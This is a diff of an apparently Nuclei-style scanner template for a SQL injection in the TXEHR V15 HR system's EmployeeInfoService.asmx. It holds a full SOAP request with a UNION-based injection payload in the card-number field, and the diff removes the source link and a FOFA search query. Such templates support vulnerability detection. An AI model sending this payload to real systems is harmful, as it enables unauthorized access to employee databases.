@@ -3,12 +3,8 @@ info:
   name: 同享人力资源管理系统-TXEHR V15-EmployeeInfoService.asmx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lxd5z5zi8mnf9idh'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lxd5z5zi8mnf9idh
-    fofa: body="/Assistant/Default.aspx"
 http:
 - raw:
   - "POST /Service/EmployeeInfoService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetEmployeeByCardNo\"\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetEmployeeByCardNo xmlns=\"http://tempuri.org/\">\n      <strCardNo>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>\n    </GetEmployeeByCardNo>\n  </soap:Body>\n</soap:Envelope>\n</soap:Envelope>"
